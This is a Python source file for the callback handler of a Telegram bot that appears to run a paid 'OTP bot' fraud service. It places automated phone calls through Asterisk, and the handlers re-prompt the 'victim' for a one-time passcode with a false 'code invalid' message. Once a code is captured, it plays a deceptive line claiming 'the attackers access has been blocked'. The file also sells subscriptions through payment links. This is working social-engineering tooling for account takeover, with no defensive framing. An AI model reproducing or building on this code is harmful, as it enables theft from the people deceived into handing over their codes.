from telegram import Update
from telegram.ext import ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import asyncio
import traceback

# OTHER IMPORTS
from database.database import check_subscription_status, fetch_calldetails, delete_calldetails, save_calldetails
from bot_utils.commands import createscript, active_calls, queue_call
from server.general import play_audio_direct
from utils.asterisk import hangup_call

async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Universal Handler")
    query = update.callback_query
    chat_id = query.message.chat_id
    message_id = query.message.message_id
    
    if 'state' in context.user_data:
        if any([
            query.data.startswith(prefix) for prefix in ["a*", "d*", "r*", "h*"]
        ]) or query.data in ["purchase", "thankyou"]:
            await query.message.reply_text("🔴 Please finish the script creation first!\n\nOr use /cancel to exit the script process")
            return
        await createscript(update, context)
        return
        
    if query.data.startswith("a*"):
        channel_id = query.data.split("a*", 1)[1]
        db_info = await fetch_calldetails(channel_id=channel_id)
        
        try:
            # CALL
            payload = f"Thank you for your assistance. We have confirmed your code and the attackers access has been blocked."
            await play_audio_direct(channel_id, payload, chat_id)   
            
            # MESSAGE
            await query.message.reply_text(f"The code has been accepted!")
            await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=None)
            
            # DELETE CALL
            active_calls.discard(update.callback_query.from_user.id)
            
            # HANGUP
            await asyncio.sleep(8)
            await hangup_call(channel_id)
            
        except Exception as e:
            # MESSAGE
            await query.message.reply_text(f"📞 Call has already ended!")
            await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=None)
            
            # DELETE CALL
            active_calls.discard(update.callback_query.from_user.id)
            
            # HANGUP
            await asyncio.sleep(8)
            await hangup_call(channel_id)
            
    elif query.data.startswith("d*"):
        channel_id = query.data.split("d*", 1)[1]
        print("channel_id:", channel_id)
        db_info = await fetch_calldetails(channel_id=channel_id)
        
        if not db_info:
            print("No data found for channel_id:", channel_id)
            return
        payload_string = db_info.get('payload_string')
        
        try:
            await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_otp")
            
            payload = " ".join([f"The code you entered was invalid. {payload_string}" for _ in range(2)])
            await play_audio_direct(channel_id, payload, chat_id) 

            # MESSAGE
            await query.message.reply_text(f"🕵️‍♀️ Victim has been asked for OTP again...")
            await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=None)
            
            # DELETE CALL
            active_calls.discard(update.callback_query.from_user.id)
            
        except Exception as e:
            # MESSAGE
            await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=None)
            # DELETE CALL
            active_calls.discard(update.callback_query.from_user.id)
            traceback.print_exc()
            print(e)
            
    elif query.data.startswith("r*"):
        channel_id = query.data.split("r*", 1)[1]
        db_info = await fetch_calldetails(channel_id=channel_id)
        call_details = db_info.get('call_details')
        
        # Check for active call
        if update.callback_query.from_user.id in active_calls:
            await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
            return
        
        
        is_paid_user = await check_subscription_status(update.callback_query.from_user.id, update.effective_user.username)
        if is_paid_user:
            try:

                # QUEUE CALL
                await queue_call(update, context, call_details)
                
                await query.message.reply_text("Adding call to queue.")
                await delete_calldetails(chat_id=update.callback_query.from_user.id)
                await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    
            except Exception as e:
                await query.message.reply_text("Couldn't restart your call!")
                await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
                await delete_calldetails(update.callback_query.from_user.id)
                
        else:
            await query.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
            
    elif query.data.startswith("h*"): 
        action, channel_id = query.data.split("*", 1)
        try:
            await hangup_call(channel_id)
            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
            active_calls.discard(update.callback_query.from_user.id)
            print("Removed call because button. (HANGUP)")
        except:
            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
            active_calls.discard(update.callback_query.from_user.id)
            print("Removed call because button. (HANGUP)")
    
    elif query.data == "purchase":
        keyboard = [
            [
                InlineKeyboardButton("💲1 Day", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjUsInByb2R1Y3RfaWQiOiIzNGI0ZjI4NC00MGI4LTRhNjIiLCJwcm9kdWN0X3F1YW50aXR5IjoiMSIsImZpZWxkcyI6WyJFbWFpbCIsIk5hbWUiXX0='),
                InlineKeyboardButton("💲2 Days", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjgsInByb2R1Y3RfaWQiOiJmZDNkNmZlOC1kMTQwLTQwMDgiLCJwcm9kdWN0X3F1YW50aXR5IjoiMSIsImZpZWxkcyI6WyJFbWFpbCIsIk5hbWUiXX0=')
            ],
            [
                InlineKeyboardButton("💲7 Days", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjIwLCJwcm9kdWN0X2lkIjoiYTU5NGE4NGQtNmQ3NC00OWJkIiwicHJvZHVjdF9xdWFudGl0eSI6IjEiLCJmaWVsZHMiOlsiRW1haWwiLCJOYW1lIl19'),
                InlineKeyboardButton("💲14 Days", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjM1LCJwcm9kdWN0X2lkIjoiZjNhZDE5YjktZjczMS00NTM3IiwicHJvZHVjdF9xdWFudGl0eSI6IjEiLCJmaWVsZHMiOlsiRW1haWwiLCJOYW1lIl19')
            ],
            [
                InlineKeyboardButton("💲1 Month", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjcwLCJwcm9kdWN0X2lkIjoiODY5Yzk2ZTQtYjk1Yi00MDFjIiwicHJvZHVjdF9xdWFudGl0eSI6IjEiLCJmaWVsZHMiOlsiRW1haWwiLCJOYW1lIl19')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Send the reply text with buttons
        reply_text = "You can buy a subscription key from the store below, or using the buttons directly!\n\nhttps://www.poof.io/@thatmaster\n\nYou can redeem using - /redeem {key}"
        await query.message.reply_text(reply_text, reply_markup=reply_markup, disable_web_page_preview=True)  

    elif query.data == "thankyou":
        await query.message.reply_text("😋 Happy we were able to help ")
    else:
        await query.message.reply_text(f"We encountered an error with that button. Please ask an admin for help!")
        
    await query.answer()